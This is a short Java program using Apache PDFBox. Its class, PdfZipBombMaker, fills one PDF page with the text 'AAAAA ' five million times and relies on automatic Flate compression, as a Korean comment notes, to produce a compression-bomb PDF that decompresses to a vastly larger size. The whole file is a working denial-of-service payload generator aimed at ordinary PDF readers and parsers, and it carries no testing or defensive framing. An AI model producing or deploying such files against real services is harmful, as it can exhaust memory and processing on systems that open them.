package com.spring.main;

import java.io.IOException;
import org.apache.pdfbox.pdmodel.*;
import org.apache.pdfbox.pdmodel.font.PDType1Font;

public class PdfZipBombMaker {

    public static void main(String[] args) throws IOException {

        PDDocument doc = new PDDocument();
        PDPage page = new PDPage();
        doc.addPage(page);

        try (PDPageContentStream cs =
                 new PDPageContentStream(doc, page)) {

            cs.beginText();
            cs.setFont(PDType1Font.HELVETICA, 12);
            cs.newLineAtOffset(50, 700);

           
            for (int i = 0; i < 5_000_000; i++) {
                cs.showText("AAAAA ");
            }

            cs.endText();
        }

        // PDFBox가 자동으로 stream 압축(FlateDecode)함
        doc.save("C:\\fake\\string.pdf");
        doc.close();

        System.out.println("string PDF 생성 완료");
    }
}
